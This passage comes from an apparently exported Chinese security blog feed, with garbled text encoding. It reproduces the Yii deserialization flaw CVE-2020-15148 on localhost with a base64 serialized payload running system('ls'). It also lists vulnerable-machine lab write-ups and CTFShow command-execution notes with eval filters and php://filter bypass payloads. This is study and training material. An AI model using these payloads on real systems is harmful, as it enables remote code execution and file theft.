<li>æ‰€ä»¥ç°åœ¨æ¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ª exp å§ã€‚æ·±å±‚æ¬¡çš„æˆ‘ä¹Ÿè§£é‡Šä¸æ¸…è€Œä¸”è¿™ä¸ªå¤ç°ç½‘ä¸Šå¾ˆå¤šï¼Œèƒ½ç”¨å°±è¡Œã€‚</li>
</ul>
<h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><ul>
<li>url å…¥å£:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=xxx // xxx ä¸º exp ç”Ÿæˆçš„å†…å®¹ã€‚</span></span><br></pre></td></tr></table></figure>

<ul>
<li>é¦–å…ˆå°†å¯æ§å‚æ•°è®¾ç½®ä¸º phpinfo å¹¶æŸ¥çœ‹æ˜¯å¦ä¼šæ˜¾ç¤ºå¤„æˆ‘æœ¬åœ°çš„ phpç¯å¢ƒã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â€¦â€¦</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºæˆåŠŸæ˜¾ç¤ºäº† phpinfo ä¿¡æ¯ã€‚</li>
<li>å†å°†å¯æ§å‚æ•°æ”¹ä¸ºæˆ‘ä»¬æƒ³æ‰§è¡Œçš„è¯­å¥ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â€¦â€¦</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°,æ³¨æ„ è‹¥ systemä¸å¯ç”¨,å¯ç”¨passthruï¼Œshell_exec ç­‰ä»£æ›¿ã€‚</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p>
<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjI6ImxzIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p>
<ul>
<li><p>å¦‚å›¾æ‰€ç¤ºæˆåŠŸæ˜¾ç¤ºå‡ºå½“å‰ç›®å½•ä¸‹çš„å†…å®¹ã€‚</p>
</li>
<li><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚</p>
</li>
</ul>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul>
<li>CVE-2020-15148</li>
<li>è¿™ä¸ªæ¼æ´ï¼Œå¯èƒ½ä¼šä½œä¸ºå˜ç§å‡ºç°çš„ CTF web é¢˜å½“ä¸­ï¼Œctshow web267 å°±æ˜¯æœ€å¥½çš„ä¾‹å­ã€‚</li>
<li>é©å‘½å°šæœªæˆåŠŸï¼Œæˆ‘ç­‰è¿˜éœ€åŠªåŠ›ã€‚</li>
<li>PHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
        <category>æ¼æ´å¤ç°</category>
      </categories>
  </entry>
  <entry>
    <title>vulnhubé¶åœºâ€”â€”The Planets:Earth</title>
    <url>/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/</url>
    <content><![CDATA[<h2 id="vulnhubé¶åœºâ€”â€”The-Planets-Earth"><a href="#vulnhubé¶åœºâ€”â€”The-Planets-Earth" class="headerlink" title="vulnhubé¶åœºâ€”â€”The Planets:Earth"></a>vulnhubé¶åœºâ€”â€”The Planets:Earth</h2>

	<div class="row">
    <embed src="earth.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”6Days_lab-v1.0.1</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%946Days-lab-v1-0-1/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”6Days-lab-v1-0-1"><a href="#webæ¸—é€â€”â€”6Days-lab-v1-0-1" class="headerlink" title="webæ¸—é€â€”â€”6Days_lab-v1.0.1"></a>webæ¸—é€â€”â€”6Days_lab-v1.0.1</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="6Days_lab-v1.0.1.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”AI-WEB1and2</title>
    <url>/2021/12/17/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94AI-WEB1and2/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”AI-WEB1and2"><a href="#webæ¸—é€â€”â€”AI-WEB1and2" class="headerlink" title="webæ¸—é€â€”â€”AI-WEB1and2"></a>webæ¸—é€â€”â€”AI-WEB1and2</h2><h3 id="AI-WEB-1-0"><a href="#AI-WEB-1-0" class="headerlink" title="AI-WEB-1.0"></a>AI-WEB-1.0</h3><p>å°è±¡ç¬”è®°é“¾æ¥:<a href="https://app.yinxiang.com/fx/66c75bd5-a490-44a6-a31d-9f07b671e2ce">https://app.yinxiang.com/fx/66c75bd5-a490-44a6-a31d-9f07b671e2ce</a></p>
<p>or</p>
<p>pdf</p>


	<div class="row">
    <embed src="AI-WEB-1.0.pdf" width="100%" height="550" type="application/pdf">
	</div>






<h3 id="AI-WEB-2-0"><a href="#AI-WEB-2-0" class="headerlink" title="AI-WEB-2.0"></a>AI-WEB-2.0</h3><p>å°è±¡ç¬”è®°é“¾æ¥:<a href="https://app.yinxiang.com/fx/63aed7db-530b-482c-afe9-c3df2b1fda88">https://app.yinxiang.com/fx/63aed7db-530b-482c-afe9-c3df2b1fda88</a></p>
<p>or</p>
<p>pdf</p>


	<div class="row">
    <embed src="AI-WEB-2.0.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”BSides-Vancouver-2018</title>
    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94BSides-Vancouver-2018/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”BSides-Vancouver-2018"><a href="#webæ¸—é€â€”â€”BSides-Vancouver-2018" class="headerlink" title="webæ¸—é€â€”â€”BSides-Vancouver-2018"></a>webæ¸—é€â€”â€”BSides-Vancouver-2018</h2><p>æ˜ åƒç¬”è®°é“¾æ¥:<a href="https://app.yinxiang.com/fx/386f12bb-ce85-49d4-af8e-181023b19004">https://app.yinxiang.com/fx/386f12bb-ce85-49d4-af8e-181023b19004</a> or pdf</p>


	<div class="row">
    <embed src="BSides-Vancouver-2018.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”Cysec1-2</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Cysec1-2/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”Cysec1"><a href="#webæ¸—é€â€”â€”Cysec1" class="headerlink" title="webæ¸—é€â€”â€”Cysec1"></a>webæ¸—é€â€”â€”Cysec1</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="Cysec1.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”Dina-1-0-1</title>
    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dina-1-0-1/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”Dina-1-0-1"><a href="#webæ¸—é€â€”â€”Dina-1-0-1" class="headerlink" title="webæ¸—é€â€”â€”Dina-1-0-1"></a>webæ¸—é€â€”â€”Dina-1-0-1</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="Dina-1-0-1.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”Easy_cloudantivirus</title>
    <url>/2022/01/12/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Easy-cloudantivirus/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”Easy-cloudantivirus"><a href="#webæ¸—é€â€”â€”Easy-cloudantivirus" class="headerlink" title="webæ¸—é€â€”â€”Easy_cloudantivirus"></a>webæ¸—é€â€”â€”Easy_cloudantivirus</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="easy_cloudantivirus.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”Medium_socnet</title>
    <url>/2022/01/17/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Medium-socnet/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”Medium-socnet"><a href="#webæ¸—é€â€”â€”Medium-socnet" class="headerlink" title="webæ¸—é€â€”â€”Medium_socnet"></a>webæ¸—é€â€”â€”Medium_socnet</h2><p>é¶æœº:</p>
<p>pdf</p>


	<div class="row">
    <embed src="medium_socnet.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”Kioptrix leve1-3</title>
    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kioptrix-leve1-3/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”Kioptrix-leve1-3"><a href="#webæ¸—é€â€”â€”Kioptrix-leve1-3" class="headerlink" title="webæ¸—é€â€”â€”Kioptrix leve1-3"></a>webæ¸—é€â€”â€”Kioptrix leve1-3</h2><h3 id="Kioptrix-leve1"><a href="#Kioptrix-leve1" class="headerlink" title="Kioptrix leve1"></a>Kioptrix leve1</h3>

	<div class="row">
    <embed src="Kioptrix_leve1.pdf" width="100%" height="550" type="application/pdf">
	</div>






<h3 id="Kioptrix-leve2"><a href="#Kioptrix-leve2" class="headerlink" title="Kioptrix leve2"></a>Kioptrix leve2</h3>

	<div class="row">
    <embed src="Kioptrix_Level2.pdf" width="100%" height="550" type="application/pdf">
	</div>






<h3 id="Kioptrix-Level3"><a href="#Kioptrix-Level3" class="headerlink" title="Kioptrix Level3"></a>Kioptrix Level3</h3>

	<div class="row">
    <embed src="Kioptrix_Level3.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”MrRobot</title>
    <url>/2021/12/15/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94MrRobot/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”MrRobot"><a href="#webæ¸—é€â€”â€”MrRobot" class="headerlink" title="webæ¸—é€â€”â€”MrRobot"></a>webæ¸—é€â€”â€”MrRobot</h2><p>å°è±¡ç¬”è®°é“¾æ¥:</p>
<p><a href="https://app.yinxiang.com/fx/b70b12ef-79a0-4778-945e-6207ee9bbfb6">https://app.yinxiang.com/fx/b70b12ef-79a0-4778-945e-6207ee9bbfb6</a></p>
<p>or</p>
<p>pdf</p>


	<div class="row">
    <embed src="MrRobot.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”Quaoar</title>
    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Quaoar/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”Quaoar"><a href="#webæ¸—é€â€”â€”Quaoar" class="headerlink" title="webæ¸—é€â€”â€”Quaoar"></a>webæ¸—é€â€”â€”Quaoar</h2><center>é¶æœºquaoa</center>



	<div class="row">
    <embed src="Readme.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”My Tomcat HOST:1</title>
    <url>/2021/12/29/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”My-Tomcat-HOST-1"><a href="#webæ¸—é€â€”â€”My-Tomcat-HOST-1" class="headerlink" title="webæ¸—é€â€”â€”My Tomcat HOST:1"></a>webæ¸—é€â€”â€”My Tomcat HOST:1</h2><p>pdf</p>


	<div class="row">
    <embed src="tomcat.pdf" width="100%" height="550" type="application/pdf">
	</div>




<p><em>æ³¨æ„è¯·åœ¨ç”µè„‘ç«¯æµè§ˆå™¨æŸ¥çœ‹ã€‚</em></p>
]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”SidkOs1.1</title>
    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”SidkOs1-1"><a href="#webæ¸—é€â€”â€”SidkOs1-1" class="headerlink" title="webæ¸—é€â€”â€”SidkOs1.1"></a>webæ¸—é€â€”â€”SidkOs1.1</h2><p>æ˜ åƒç¬”è®°é“¾æ¥:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>


	<div class="row">
    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”covfefe</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94covfefe/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”covfefe"><a href="#webæ¸—é€â€”â€”covfefe" class="headerlink" title="webæ¸—é€â€”â€”covfefe"></a>webæ¸—é€â€”â€”covfefe</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="covfefe.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”dawn</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dawn/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”dawn"><a href="#webæ¸—é€â€”â€”dawn" class="headerlink" title="webæ¸—é€â€”â€”dawn"></a>webæ¸—é€â€”â€”dawn</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="dawn.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”devguru</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94devguru/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”devguru"><a href="#webæ¸—é€â€”â€”devguru" class="headerlink" title="webæ¸—é€â€”â€”devguru"></a>webæ¸—é€â€”â€”devguru</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="devguru.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”dhanush</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dhanush/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”dhanush"><a href="#webæ¸—é€â€”â€”dhanush" class="headerlink" title="webæ¸—é€â€”â€”dhanush"></a>webæ¸—é€â€”â€”dhanush</h2><p>é¶æœº:</p>


	<div class="row">
    <embed src="dhanush.pdf" width="100%" height="550" type="application/pdf">
	</div>




]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>äº‘æœåŠ¡å™¨é…ç½®NPSæœåŠ¡å®ç°å†…ç½‘ç©¿é€</title>
    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h2 id="äº‘æœåŠ¡å™¨é…ç½®NPSæœåŠ¡å®ç°å†…ç½‘ç©¿é€"><a href="#äº‘æœåŠ¡å™¨é…ç½®NPSæœåŠ¡å®ç°å†…ç½‘ç©¿é€" class="headerlink" title="äº‘æœåŠ¡å™¨é…ç½®NPSæœåŠ¡å®ç°å†…ç½‘ç©¿é€"></a>äº‘æœåŠ¡å™¨é…ç½®NPSæœåŠ¡å®ç°å†…ç½‘ç©¿é€</h2><p>pdf:</p>


	<div class="row">
    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>å†…ç½‘ç©¿é€</category>
      </categories>
  </entry>
  <entry>
    <title>webæ¸—é€â€”â€”evilscience</title>
    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94evilscience/</url>
    <content><![CDATA[<h2 id="webæ¸—é€â€”â€”evilscience"><a href="#webæ¸—é€â€”â€”evilscience" class="headerlink" title="webæ¸—é€â€”â€”evilscience"></a>webæ¸—é€â€”â€”evilscience</h2><p>é¶æœºï¼š</p>


	<div class="row">
    <embed src="evilscience.pdf" width="100%" height="550" type="application/pdf">
	</div>



]]></content>
      <categories>
        <category>webæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow Webç¬”è®°</title>
    <url>/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ctfshow-å‘½ä»¤æ‰§è¡Œç¬”è®°"><a href="#ctfshow-å‘½ä»¤æ‰§è¡Œç¬”è®°" class="headerlink" title="ctfshow å‘½ä»¤æ‰§è¡Œç¬”è®°"></a>ctfshow å‘½ä»¤æ‰§è¡Œç¬”è®°</h1><h2 id="web34â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web34â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web34â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web34â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ï¼šflag, system, php, cat, sort, shell, å°æ•°ç‚¹, ç©ºæ ¼, å•å¼•å·ï¼Œåå¼•å·ï¼Œecho, åˆ†å·ï¼Œå·¦æ‹¬å·ï¼Œå†’å·ï¼ŒåŒå¼•å·ï¼›<br>æ­¤é¢˜åŒä¸Šä¸€é¢˜ç±»ä¼¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web34.png"></p>
<p>base64è§£ç å³å¯å¾—åˆ°flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;176e1aa8-38eb-48f9-a1a9-07a5ea683dd3&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ctfshow{176e1aa8-38eb-48f9-a1a9-07a5ea683dd3}</p>
<h2 id="web35â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web35â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web35â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web35â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ä¸€å¤§å †ç©æ„å„¿ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web35.png"></p>
<p>ä¸web34,33ç±»ä¼¼base64è§£ç å³å¯è·å¾—flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 03:37:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;cddf1bd1-a9c1-4ef6-bb94-50d55091a10e&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ctfshow{cddf1bd1-a9c1-4ef6-bb94-50d55091a10e}</p>
<h2 id="web36â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web36â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web36â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web36â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ï¼š flag,system,php,cat,sort,shell, å°æ•°ç‚¹ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œecho,åˆ†å·ï¼Œå·¦æ‹¬å·,å†’å·ï¼ŒåŒå¼•å·ï¼Œå·¦å°–æ‹¬å·ï¼Œç­‰å·ï¼Œæ•°å­—0-9ï¼›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>åŒä¸Šä¸€é¢˜:</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web36.png"></p>
<p>base64è§£ç :</p>
